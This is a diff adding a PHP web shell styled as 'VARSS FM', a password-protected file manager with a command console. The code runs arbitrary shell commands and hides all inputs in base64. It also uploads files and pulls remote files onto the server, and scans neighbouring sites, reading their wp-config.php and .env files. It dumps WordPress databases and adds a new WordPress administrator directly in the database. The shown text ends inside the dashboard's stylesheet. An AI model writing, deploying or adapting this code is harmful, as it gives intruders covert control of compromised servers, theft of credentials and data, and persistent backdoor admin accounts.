@@ -1,0 +1,685 @@
+<?php
+session_start();
+$correct_password = 'danang123';
+
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        if ($_POST['password'] === $correct_password) {
+            $_SESSION['logged_in'] = true;
+            session_regenerate_id(true);
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = 'Password salah!';
+        }
+    }
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VARSS FM - Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Press+Start+2P&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: 'Inter', sans-serif; background: #000; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1rem; }
+.login-card { background: rgba(10, 10, 15, 0.9); backdrop-filter: blur(12px); border-radius: 1.5rem; padding: 2.5rem 2rem; width: 100%; max-width: 380px; border: 2px solid rgba(0, 255, 136, 0.3); text-align: center; box-shadow: 0 0 40px rgba(0, 255, 136, 0.1); }
+.logo { font-size: 2rem; font-weight: 800; background: linear-gradient(135deg, #00ff88, #10b981); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 0.5rem; font-family: 'JetBrains Mono', monospace; letter-spacing: 2px; }
+.sub { color: #9ca3af; margin-bottom: 2rem; font-size: 0.8rem; letter-spacing: 1px; }
+.input-group { margin-bottom: 1.5rem; }
+.input-group label { display: block; font-family: 'Press Start 2P', cursive; font-size: 0.7rem; color: #00ff88; margin-bottom: 0.8rem; letter-spacing: 2px; }
+.input-group input { width: 100%; background: transparent; border: none; border-bottom: 2px solid #00ff88; padding: 0.8rem 0.5rem; color: #00ff88; font-family: 'JetBrains Mono', monospace; font-size: 1.1rem; text-align: center; letter-spacing: 3px; outline: none; transition: all 0.3s; }
+.input-group input:focus { border-bottom-color: #10b981; box-shadow: 0 4px 12px rgba(0, 255, 136, 0.2); }
+.input-group input::placeholder { color: rgba(0, 255, 136, 0.3); letter-spacing: 1px; }
+.login-btn { background: transparent; border: 2px solid #00ff88; width: 100%; padding: 1rem; border-radius: 0.5rem; font-family: 'Press Start 2P', cursive; font-size: 0.75rem; color: #00ff88; cursor: pointer; letter-spacing: 2px; transition: all 0.3s; margin-top: 1rem; }
+.login-btn:hover { background: #00ff88; color: #000; box-shadow: 0 0 20px rgba(0, 255, 136, 0.5); }
+.error { color: #f87171; margin-top: 1rem; font-size: 0.85rem; font-family: 'JetBrains Mono', monospace; }
+</style>
+</head>
+<body>
+<div class="login-card">
+    <div class="logo">VARSS FM</div>
+    <div class="sub">FILE MANAGER + CMD</div>
+    <?php if (isset($error)) echo "<div class='error'>⚠ $error</div>"; ?>
+    <form method="POST" id="loginForm">
+        <div class="input-group">
+            <label>PASSWORD</label>
+            <input type="password" name="password" placeholder="••••••••" autofocus required id="passwordInput" autocomplete="off">
+        </div>
+        <button type="submit" class="login-btn">PRESS START</button>
+    </form>
+</div>
+</body>
+</html>
+<?php exit; }
+
+// ============ LOGIC FILE MANAGER ============
+$disabled_functions = array_map('trim', explode(',', ini_get('disable_functions')));
+$exec_functions_list = ['proc_open', 'popen', 'system', 'passthru', 'shell_exec', 'exec'];
+$available_exec = [];
+foreach ($exec_functions_list as $fn) { if (function_exists($fn) && !in_array($fn, $disabled_functions)) $available_exec[] = $fn; }
+$cmd_warning = empty($available_exec) ? "⚠️ Server memblokir SEMUA fungsi eksekusi." : "";
+
+function executeCommand($cmd) {
+    global $available_exec;
+    if (empty($available_exec)) return ['output' => "❌ Semua fungsi eksekusi diblokir.", 'return_var' => 1, 'method' => 'none'];
+    if (in_array('proc_open', $available_exec)) {
+        $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+        $process = @proc_open($cmd, $descriptorspec, $pipes);
+        if (is_resource($process)) {
+            fclose($pipes[0]); $stdout = stream_get_contents($pipes[1]); $stderr = stream_get_contents($pipes[2]);
+            fclose($pipes[1]); fclose($pipes[2]); $return_var = proc_close($process);
+            return ['output' => trim($stdout . "\n" . $stderr), 'return_var' => $return_var, 'method' => 'proc_open'];
+        }
+    }
+    if (in_array('exec', $available_exec)) { $output = []; $return_var = -1; @exec($cmd . ' 2>&1', $output, $return_var); return ['output' => trim(implode("\n", $output)), 'return_var' => $return_var, 'method' => 'exec']; }
+    if (in_array('shell_exec', $available_exec)) { $output = @shell_exec($cmd . ' 2>&1'); return ['output' => trim($output ?? ''), 'return_var' => ($output === null) ? 1 : 0, 'method' => 'shell_exec']; }
+    return ['output' => " Gagal.", 'return_var' => 1, 'method' => 'none'];
+}
+
+function cleanDomain($url) {
+    $url = preg_replace('#^https?://#i', '', $url);
+    $url = preg_replace('#^www\.#i', '', $url);
+    $url = rtrim(explode('/', $url)[0], '/');
+    $url = rtrim(explode('?', $url)[0], '/');
+    return strtolower($url);
+}
+
+function scanSites($base_path) {
+    $sites = [];
+    $config_files = ['wp-config.php', '.env', 'config.php', 'configuration.php'];
+    $ignore_folders = ['wp-admin', 'wp-content', 'wp-includes', 'wp-json', 'wp-rest', 'node_modules', 'vendor', 'cache', 'logs', 'backup', 'backups', '.well-known', 'cgi-bin', 'tmp', 'temp', '__MACOSX', '.git', 'wpfm-private-backups', 'updraft', 'ai1wm-backups'];
+    if (!is_dir($base_path)) return $sites;
+    $items = @scandir($base_path); if ($items === false) return $sites;
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $full_path = $base_path . '/' . $item;
+        if (!is_dir($full_path)) continue;
+        if (in_array(strtolower($item), array_map('strtolower', $ignore_folders))) continue;
+        if (substr($item, 0, 1) === '.') continue;
+        $has_config = false; $detected_domain = ''; $site_type = 'Unknown';
+        foreach ($config_files as $config_file) {
+            $config_path = $full_path . '/' . $config_file;
+            if (file_exists($config_path)) {
+                $has_config = true;
+                if ($config_file === 'wp-config.php') {
+                    $site_type = 'WordPress';
+                    $content = @file_get_contents($config_path);
+                    if ($content) {
+                        if (preg_match("/define\s*\(\s*['\"]WP_HOME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m)) $detected_domain = cleanDomain($m[1]);
+                        elseif (preg_match("/define\s*\(\s*['\"]WP_SITEURL['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m)) $detected_domain = cleanDomain($m[1]);
+                    }
+                } elseif ($config_file === '.env') {
+                    $site_type = 'Laravel/Modern';
+                    $content = @file_get_contents($config_path);
+                    if ($content && preg_match('/APP_URL\s*=\s*(https?:\/\/[^\s]+)/i', $content, $m)) $detected_domain = cleanDomain($m[1]);
+                } elseif ($config_file === 'configuration.php') $site_type = 'Joomla';
+                elseif ($config_file === 'config.php') $site_type = 'Custom PHP';
+                break;
+            }
+        }
+        if (!$has_config) {
+            $parent_has_wp = file_exists($base_path . '/wp-config.php');
+            if (!$parent_has_wp && (file_exists($full_path . '/index.php') || file_exists($full_path . '/index.html'))) { $has_config = true; $site_type = 'Static/Basic'; }
+        }
+        if ($has_config) {
+            if (empty($detected_domain)) $detected_domain = cleanDomain($item);
+            $is_active = false;
+            if (filter_var($detected_domain, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
+                $check_url = 'http://' . $detected_domain;
+                $ch = @curl_init($check_url);
+                if ($ch) {
+                    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 5, CURLOPT_NOBODY => true, CURLOPT_SSL_VERIFYPEER => false]);
+                    @curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
+                    $is_active = ($http_code >= 200 && $http_code < 400);
+                }
+            }
+            $sites[] = ['folder' => $item, 'domain' => $detected_domain, 'type' => $site_type, 'active' => $is_active, 'path' => $full_path];
+        }
+    }
+    return $sites;
+}
+
+function find_wp_config($dir) {
+    $dir = rtrim($dir, '/');
+    if (file_exists($dir . '/wp-config.php')) return $dir . '/wp-config.php';
+    $parent = dirname($dir);
+    if ($parent !== $dir && file_exists($parent . '/wp-config.php')) return $parent . '/wp-config.php';
+    return false;
+}
+
+function parse_wp_config($config_path) {
+    if (!$config_path || !file_exists($config_path)) return false;
+    $content = @file_get_contents($config_path); if ($content === false) return false;
+    $config = [];
+    foreach (['DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST', 'DB_CHARSET'] as $key) {
+        if (preg_match("/define\s*\(\s*['\"]" . $key . "['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m)) $config[$key] = $m[1];
+    }
+    if (preg_match("/\\\$table_prefix\s*=\s*['\"](.*?)['\"]/i", $content, $m)) $config['table_prefix'] = $m[1]; else $config['table_prefix'] = 'wp_';
+    return (isset($config['DB_NAME']) && isset($config['DB_USER'])) ? $config : false;
+}
+
+class WP_PasswordHash {
+    private $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+    private $iteration_count_log2; private $random_state;
+    public function __construct($iteration_count_log2 = 8, $portable_hashes = true) { $this->iteration_count_log2 = $iteration_count_log2; $this->random_state = microtime() . uniqid(rand(), true); }
+    private function get_random_bytes($count) {
+        if (function_exists('openssl_random_pseudo_bytes')) return openssl_random_pseudo_bytes($count);
+        $output = ''; if (@is_readable('/dev/urandom')) { $fh = @fopen('/dev/urandom', 'rb'); if ($fh) { $output = @fread($fh, $count); @fclose($fh); } }
+        if (strlen($output) < $count) { $output = ''; for ($i = 0; $i < $count; $i += 16) { $this->random_state = md5(microtime() . $this->random_state); $output .= pack('H*', md5($this->random_state)); } $output = substr($output, 0, $count); }
+        return $output;
+    }
+    private function encode64($input, $count) {
+        $output = ''; $i = 0;
+        do { $value = ord($input[$i++]); $output .= $this->itoa64[$value & 0x3f]; if ($i < $count) $value |= ord($input[$i]) << 8; $output .= $this->itoa64[($value >> 6) & 0x3f]; if ($i++ >= $count) break; if ($i < $count) $value |= ord($input[$i]) << 16; $output .= $this->itoa64[($value >> 12) & 0x3f]; if ($i++ >= $count) break; $output .= $this->itoa64[($value >> 18) & 0x3f]; } while ($i < $count);
+        return $output;
+    }
+    private function crypt_private($password, $setting) {
+        $output = '*0'; if (substr($setting, 0, 2) === $output) $output = '*1'; $id = substr($setting, 0, 3); if ($id !== '$P$' && $id !== '$H$') return $output;
+        $count_log2 = strpos($this->itoa64, $setting[3]); if ($count_log2 < 7 || $count_log2 > 30) return $output; $count = 1 << $count_log2; $salt = substr($setting, 4, 8); if (strlen($salt) !== 8) return $output;
+        $hash = md5($salt . $password, true); do { $hash = md5($hash . $password, true); } while (--$count); $output = substr($setting, 0, 12); $output .= $this->encode64($hash, 16); return $output;
+    }
+    public function HashPassword($password) { $random = $this->get_random_bytes(6); $hash = $this->crypt_private($password, '$P$' . $this->itoa64[min($this->iteration_count_log2 + 5, 30)] . $this->encode64($random, 6)); if ($hash && strlen($hash) === 34) return $hash; return md5($password); }
+}
+
+function backup_wp_database($config, $output_file) {
+    $conn = @new mysqli($config['DB_HOST'], $config['DB_USER'], $config['DB_PASSWORD'], $config['DB_NAME']);
+    if ($conn->connect_error) return "Gagal koneksi DB: " . $conn->connect_error;
+    $conn->set_charset($config['DB_CHARSET'] ?? 'utf8mb4');
+    $sql = "-- VARSS FM WordPress Database Backup\n-- Database: " . $config['DB_NAME'] . "\n-- Tanggal: " . date('Y-m-d H:i:s') . "\n\nSET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS = 0;\n\n";
+    $tables = $conn->query("SHOW TABLES"); if (!$tables) { $conn->close(); return "Gagal membaca tabel: " . $conn->error; }
+    $table_count = 0;
+    while ($row = $tables->fetch_row()) {
+        $table = $row[0]; $table_count++;
+        $create = $conn->query("SHOW CREATE TABLE `$table`"); $create_row = $create->fetch_row();
+        $sql .= "DROP TABLE IF EXISTS `$table`;\n" . $create_row[1] . ";\n\n";
+        $data = $conn->query("SELECT * FROM `$table`");
+        if ($data && $data->num_rows > 0) {
+            while ($row = $data->fetch_assoc()) { $values = []; foreach ($row as $value) { if ($value === null) $values[] = 'NULL'; else $values[] = "'" . $conn->real_escape_string($value) . "'"; } $sql .= "INSERT INTO `$table` VALUES (" . implode(',', $values) . ");\n"; }
+            $sql .= "\n";
+        }
+    }
+    $sql .= "SET FOREIGN_KEY_CHECKS = 1;\n"; $conn->close();
+    if (@file_put_contents($output_file, $sql) === false) return "Gagal menulis file SQL"; return "OK|" . $table_count;
+}
+
+function backup_wp_files($source_dir, $output_zip) {
+    if (!class_exists('ZipArchive')) return "ZipArchive tidak tersedia";
+    $zip = new ZipArchive(); if ($zip->open($output_zip, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return "Gagal membuat ZIP";
+    $source_dir = realpath($source_dir); $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source_dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);
+    $file_count = 0;
+    foreach ($files as $file) { if (!$file->isDir()) { $file_path = $file->getRealPath(); $relative_path = substr($file_path, strlen($source_dir) + 1); if (realpath($output_zip) === $file_path) continue; if ($zip->addFile($file_path, $relative_path)) $file_count++; } }
+    $zip->close(); return "OK|" . $file_count;
+}
+
+function create_wp_admin_user($config, $username, $password, $email) {
+    $conn = @new mysqli($config['DB_HOST'], $config['DB_USER'], $config['DB_PASSWORD'], $config['DB_NAME']);
+    if ($conn->connect_error) return "Gagal koneksi DB: " . $conn->connect_error;
+    $conn->set_charset($config['DB_CHARSET'] ?? 'utf8mb4');
+    $prefix = $config['table_prefix']; $users_table = $prefix . 'users'; $meta_table = $prefix . 'usermeta';
+    $check = $conn->prepare("SELECT ID FROM `$users_table` WHERE user_login = ? OR user_email = ?"); $check->bind_param("ss", $username, $email); $check->execute(); $result = $check->get_result();
+    if ($result->num_rows > 0) { $check->close(); $conn->close(); return "Username atau email sudah terdaftar"; } $check->close();
+    $hasher = new WP_PasswordHash(8, true); $password_hash = $hasher->HashPassword($password); $now = date('Y-m-d H:i:s'); $user_nicename = strtolower(preg_replace('/[^a-z0-9\-]/i', '-', $username));
+    $stmt = $conn->prepare("INSERT INTO `$users_table` (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
+    $stmt->bind_param("sssssssi", $username, $password_hash, $user_nicename, $email, '', $now, 0, $username);
+    if (!$stmt->execute()) { $err = $stmt->error; $stmt->close(); $conn->close(); return "Gagal insert user: " . $err; } $user_id = $stmt->insert_id; $stmt->close();
+    $stmt = $conn->prepare("INSERT INTO `$meta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)"); $stmt->bind_param("iss", $user_id, $prefix . 'capabilities', 'a:1:{s:13:"administrator";b:1;}'); $stmt->execute(); $stmt->close();
+    $stmt = $conn->prepare("INSERT INTO `$meta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)"); $stmt->bind_param("iss", $user_id, $prefix . 'user_level', '10'); $stmt->execute(); $stmt->close();
+    $conn->close(); return "OK|" . $user_id;
+}
+
+function formatSize($bytes) { if ($bytes === false) return '-'; $units = ['B', 'KB', 'MB', 'GB', 'TB']; $bytes = max($bytes, 0); $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); $pow = min($pow, count($units) - 1); $bytes /= pow(1024, $pow); return round($bytes, 2) . ' ' . $units[$pow]; }
+function getPerms($file) { clearstatcache(); return substr(sprintf('%o', fileperms($file)), -4); }
+function getPermsColor($file) { return is_writable($file) ? '#10b981' : '#ef4444'; }
+function formatDate($file) {
+    $time = filemtime($file);
+    if ($time === false) return '-';
+    return date('d M Y, H:i', $time);
+}
+
+$clean_url = strtok($_SERVER["REQUEST_URI"], '?'); $base_dir = str_replace('\\', '/', dirname(__FILE__));
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys_action'])) {
+    $sys_action = $_POST['sys_action'];
+    if ($sys_action === 'cd_b64' && isset($_POST['payload_b64'])) { $req_dir = base64_decode($_POST['payload_b64']); if ($req_dir !== false) { $real = realpath($req_dir); if ($real && is_dir($real)) $_SESSION['current_dir'] = str_replace('\\', '/', $real); } header("Location: " . $clean_url); exit; }
+    if ($sys_action === 'open_edit_b64' && isset($_POST['payload_b64'])) { $_SESSION['edit_file'] = base64_decode($_POST['payload_b64']); header("Location: " . $clean_url); exit; }
+    if ($sys_action === 'close_edit') { unset($_SESSION['edit_file']); header("Location: " . $clean_url); exit; }
+}
+
+$current_dir = $_SESSION['current_dir'] ?? $base_dir; if (!is_dir($current_dir)) { $current_dir = $base_dir; $_SESSION['current_dir'] = $current_dir; }
+
+$message = ''; $message_type = 'success';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
+    $action = $_POST['action'];
+    
+    if ($action === 'upload_b64' && isset($_POST['filename_b64'], $_POST['file_data_b64'])) { $filename = base64_decode($_POST['filename_b64']); $upload_path = $current_dir . '/' . basename($filename); $file_data = base64_decode($_POST['file_data_b64']); if ($file_data !== false && file_put_contents($upload_path, $file_data) !== false) $message = "Upload OK"; else { $message = "Upload gagal"; $message_type = "error"; } }
+    if ($action === 'curl_download_b64' && isset($_POST['url_b64'])) { $url = base64_decode($_POST['url_b64']); $save_as_b64 = $_POST['save_as_b64'] ?? ''; $save_as = !empty($save_as_b64) ? base64_decode($save_as_b64) : basename(parse_url($url, PHP_URL_PATH)); if (empty($save_as)) $save_as = "downloaded_" . time() . ".txt"; $target = $current_dir . '/' . $save_as; $ch = curl_init($url); $fp = @fopen($target, 'wb'); if ($fp) { curl_setopt_array($ch, [CURLOPT_FILE => $fp, CURLOPT_HEADER => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_USERAGENT => 'Mozilla/5.0']); curl_exec($ch); $error = curl_error($ch); curl_close($ch); fclose($fp); if (empty($error)) $message = "Download OK"; else { $message = "Gagal: " . $error; $message_type = "error"; @unlink($target); } } else { $message = "Gagal buat file"; $message_type = "error"; } }
+    if ($action === 'new_folder' && !empty($_POST['folder_name_b64'])) { $folder_name = base64_decode($_POST['folder_name_b64']); $new_folder = $current_dir . '/' . basename($folder_name); if (!file_exists($new_folder) && mkdir($new_folder, 0755)) $message = "Folder '$folder_name' berhasil dibuat"; else { $message = "Gagal membuat folder"; $message_type = "error"; } }
+    if ($action === 'new_file' && !empty($_POST['file_name_b64'])) { $file_name = basename(base64_decode($_POST['file_name_b64'])); $new_file = $current_dir . '/' . $file_name; if (empty($file_name)) { $message = "Nama file tidak boleh kosong"; $message_type = "error"; } elseif (!is_writable($current_dir)) { $message = "Folder tidak memiliki izin tulis"; $message_type = "error"; } elseif (file_exists($new_file)) { $message = "File sudah ada"; $message_type = "error"; } else { $created = @file_put_contents($new_file, ''); $message = ($created !== false) ? "✅ File '$file_name' berhasil dibuat" : "❌ Gagal membuat file"; $message_type = ($created !== false) ? "success" : "error"; } }
+    if ($action === 'delete_b64' && isset($_POST['target_b64'])) { $target = $current_dir . '/' . base64_decode($_POST['target_b64']); if (is_dir($target)) { $res = @rmdir($target); $message = $res ? "Folder dihapus" : "Hapus folder gagal"; $message_type = $res ? "success" : "error"; } else { $res = @unlink($target); $message = $res ? "File dihapus" : "Hapus file gagal"; $message_type = $res ? "success" : "error"; } }
+    if ($action === 'rename_b64' && isset($_POST['old_name_b64'], $_POST['new_name_b64'])) { $old = base64_decode($_POST['old_name_b64']); $new = base64_decode($_POST['new_name_b64']); if (rename($current_dir . '/' . $old, $current_dir . '/' . $new)) $message = "Nama diubah menjadi '$new'"; else { $message = "Gagal mengubah nama"; $message_type = "error"; } }
+    if ($action === 'chmod_b64' && isset($_POST['target_b64'], $_POST['perms'])) { $target = $current_dir . '/' . base64_decode($_POST['target_b64']); if (@chmod($target, octdec($_POST['perms']))) $message = "Permission diubah ke " . $_POST['perms']; else { $message = "Gagal mengubah permission"; $message_type = "error"; } }
+    if ($action === 'save_edit' && isset($_POST['target_file_b64'])) { $target_file = $current_dir . '/' . base64_decode($_POST['target_file_b64']); $content = $_POST['file_content'] ?? ''; if (file_put_contents($target_file, $content) !== false) { $message = "File berhasil disimpan"; unset($_SESSION['edit_file']); } else { $message = "Gagal menyimpan file"; $message_type = "error"; } }
+    
+    if ($action === 'backup_wp') {
+        $mode = $_POST['backup_mode'] ?? 'both'; $wp_config_path = find_wp_config($current_dir);
+        if (!$wp_config_path) { $message = "❌ wp-config.php tidak ditemukan."; $message_type = "error"; }
+        else {
+            $config = parse_wp_config($wp_config_path); if (!$config) { $message = "❌ Gagal membaca wp-config.php"; $message_type = "error"; }
+            else {
+                $timestamp = date('Ymd_His'); $results = [];
+                if ($mode === 'db' || $mode === 'both') { $sql_file = $current_dir . '/backup_db_' . $config['DB_NAME'] . '_' . $timestamp . '.sql'; $res = backup_wp_database($config, $sql_file); if (strpos($res, 'OK|') === 0) $results[] = "✅ Database: " . substr($res, 3) . " tabel → " . basename($sql_file); else $results[] = "❌ Database: " . $res; }
+                if ($mode === 'files' || $mode === 'both') { $zip_file = $current_dir . '/backup_files_' . $timestamp . '.zip'; $res = backup_wp_files($current_dir, $zip_file); if (strpos($res, 'OK|') === 0) $results[] = "✅ Files: " . substr($res, 3) . " file → " . basename($zip_file) . " (" . formatSize(filesize($zip_file)) . ")"; else $results[] = "❌ Files: " . $res; }
+                $message = implode("\n", $results); $message_type = (strpos($message, '❌') === false) ? "success" : "error";
+            }
+        }
+    }
+    
+    if ($action === 'create_wp_admin') {
+        $username = trim($_POST['wp_username'] ?? ''); $password = $_POST['wp_password'] ?? ''; $email = trim($_POST['wp_email'] ?? '');
+        if (empty($username) || empty($password) || empty($email)) { $message = "❌ Data tidak lengkap"; $message_type = "error"; }
+        else {
+            $wp_config_path = find_wp_config($current_dir); if (!$wp_config_path) { $message = " wp-config.php tidak ditemukan."; $message_type = "error"; }
+            else { $config = parse_wp_config($wp_config_path); if (!$config) { $message = "❌ Gagal membaca wp-config.php"; $message_type = "error"; }
+                else { $res = create_wp_admin_user($config, $username, $password, $email); if (strpos($res, 'OK|') === 0) { $message = "✅ Database terhubung dan User Admin berhasil dibuat."; $message_type = "success"; } else { $message = "❌ " . $res; $message_type = "error"; } } }
+        }
+    }
+
+    if ($action === 'site_scan') {
+        $scan_path = $_POST['scan_path'] ?? $current_dir;
+        $scan_path = realpath($scan_path);
+        if (!$scan_path || !is_dir($scan_path)) { $message = "❌ Path tidak valid"; $message_type = "error"; }
+        else { $sites = scanSites($scan_path); $_SESSION['scan_results'] = $sites; $_SESSION['scan_path'] = basename($scan_path); $message = "✅ Scan selesai! Ditemukan " . count($sites) . " website."; $message_type = "success"; }
+    }
+    
+    if ($action === 'run_command' && isset($_POST['cmd_b64'])) { $cmd = base64_decode($_POST['cmd_b64']); $result = executeCommand($cmd); $output_text = $result['output']; if ($result['return_var'] !== 0 && empty(trim($output_text))) $output_text .= "\n[Info] Kode error: " . $result['return_var'] . " | Metode: " . $result['method']; else $output_text .= "\n[✓] Via: " . $result['method']; $_SESSION['cmd_output'] = $output_text; $_SESSION['cmd_input'] = $cmd; header("Location: " . $clean_url); exit; }
+    if (!empty($message)) { $_SESSION['msg'] = $message; $_SESSION['msg_type'] = $message_type; header("Location: " . $clean_url); exit; }
+}
+
+if (isset($_SESSION['msg'])) { $message = $_SESSION['msg']; $message_type = $_SESSION['msg_type']; unset($_SESSION['msg'], $_SESSION['msg_type']); }
+$cmd_output = $_SESSION['cmd_output'] ?? null; $cmd_input = $_SESSION['cmd_input'] ?? ''; unset($_SESSION['cmd_output'], $_SESSION['cmd_input']);
+
+$items = @scandir($current_dir); if ($items === false) { $items = []; $message = "Akses direktori ditolak"; $message_type = "error"; }
+$directories = []; $files = []; foreach ($items as $item) { if ($item === '.' || $item === '..') continue; if (is_dir($current_dir . '/' . $item)) $directories[] = $item; else $files[] = $item; }
+sort($directories); sort($files);
+
+$edit_mode = false; $edit_content = ''; $edit_filename = '';
+if (isset($_SESSION['edit_file'])) { $edit_filename = $_SESSION['edit_file']; $edit_path = $current_dir . '/' . $edit_filename; if (is_file($edit_path) && is_readable($edit_path)) { $edit_mode = true; $content = file_get_contents($edit_path); $edit_content = ($content !== false) ? $content : ''; } else unset($_SESSION['edit_file']); }
+
+$scan_results = $_SESSION['scan_results'] ?? [];
+$scan_path_name = $_SESSION['scan_path'] ?? '';
+
+$breadcrumbs = [];
+$path_parts = explode('/', trim($current_dir, '/'));
+$build_path = '';
+foreach ($path_parts as $part) {
+    $build_path .= '/' . $part;
+    $breadcrumbs[] = ['name' => $part, 'path' => $build_path];
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+<title>VARSS FM</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Inter', sans-serif; background: #0a0a0f; color: #e2e8f0; min-height: 100vh; display: flex; flex-direction: column; padding-bottom: 40px; }
+.top-bar { display: flex; align-items: center; justify-content: space-between; padding: 0.6rem 0.8rem; background: #0a0a0f; border-bottom: 1px solid rgba(255,255,255,0.05); }
+.app-logo { display: flex; align-items: center; gap: 6px; font-size: 1rem; font-weight: 700; color: #e2e8f0; }
+.app-logo i { color: #00ff88; font-size: 1rem; }
+.app-logo span { background: linear-gradient(135deg, #00ff88, #10b981); -webkit-background-clip: text; background-clip: text; color: transparent; }
+.top-actions { display: flex; gap: 4px; align-items: center; }
+.top-btn { width: 30px; height: 30px; background: rgba(30,30,45,0.8); border: 1px solid rgba(255,255,255,0.08); border-radius: 0.5rem; color: #9ca3af; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; font-size: 0.75rem; transition: all 0.2s; text-decoration: none; }
+.top-btn:hover { background: rgba(0,255,136,0.1); color: #00ff88; border-color: rgba(0,255,136,0.3); }
+.top-btn.green { background: linear-gradient(135deg, #00ff88, #10b981); color: #000; border: none; font-weight: bold; }
+.top-btn.green:hover { opacity: 0.9; }
+.top-btn.signout { background: rgba(239,68,68,0.15); color: #ef4444; border-color: rgba(239,68,68,0.3); }
+.top-btn.signout:hover { background: rgba(239,68,68,0.3); color: #ef4444; }
+.breadcrumbs { display: flex; align-items: center; gap: 4px; padding: 0.6rem 0.8rem; background: rgba(15,15,25,0.6); border-bottom: 1px solid rgba(255,255,255,0.05); overflow-x: auto; scrollbar-width: none; }
+.breadcrumbs::-webkit-scrollbar { display: none; }
+.bc-home { width: 28px; height: 28px; background: rgba(30,30,45,0.8); border: 1px solid rgba(255,255,255,0.08); border-radius: 0.4rem; color: #9ca3af; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 0.75rem; }
+.bc-home:hover { background: rgba(0,255,136,0.1); color: #00ff88; }
+.bc-sep { color: #4b5563; font-size: 0.75rem; flex-shrink: 0; }
+.bc-item { background: rgba(30,30,45,0.6); border: 1px solid rgba(255,255,255,0.06); padding: 0.3rem 0.6rem; border-radius: 0.4rem; color: #d1d5db; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; cursor: pointer; white-space: nowrap; flex-shrink: 0; transition: all 0.15s; }
+.bc-item:hover { background: rgba(0,255,136,0.1); color: #00ff88; border-color: rgba(0,255,136,0.3); }
+.bc-item.current { background: rgba(0,255,136,0.1); color: #00ff88; border-color: rgba(0,255,136,0.3); }
+.notification { padding: 0.5rem 1rem; margin: 0.5rem 0.8rem; border-radius: 0.8rem; font-size: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 6px; }
+.notification.warning { background: rgba(245,158,11,0.15); border: 1px solid rgba(245,158,11,0.3); color: #fcd34d; }
+.notification.success { background: rgba(0,255,136,0.1); border: 1px solid rgba(0,255,136,0.3); color: #00ff88; }
+.notification.error { background: rgba(239,68,68,0.15); border: 1px solid rgba(239,68,68,0.3); color: #ef4444; }
+.file-list { flex: 1; padding: 0.5rem 0; }
+.file-item { display: flex; align-items: center; padding: 0.8rem 0.8rem; border-bottom: 1px solid rgba(255,255,255,0.03); cursor: pointer; transition: background 0.15s; gap: 10px; }
+.file-item:hover { background: rgba(0,255,136,0.03); }
+.file-item.parent { background: rgba(245,158,11,0.02); }
+.file-item.parent:hover { background: rgba(245,158,11,0.06); }
+.file-icon { width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 1.4rem; }
+.file-icon.folder { color: #d4a574; }
+.file-icon.file { color: #6b7280; font-size: 1.2rem; }
+.file-icon.parent-icon { color: #d4a574; }
+.file-content { flex: 1; min-width: 0; }
+.file-name { font-size: 0.9rem; font-weight: 600; color: #e2e8f0; margin-bottom: 2px; word-break: break-word; font-family: 'JetBrains Mono', monospace; }
+.file-name.parent-name { color: #fbbf24; font-family: 'Inter', sans-serif; font-size: 0.95rem; }
+.file-meta { font-size: 0.7rem; color: #6b7280; display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
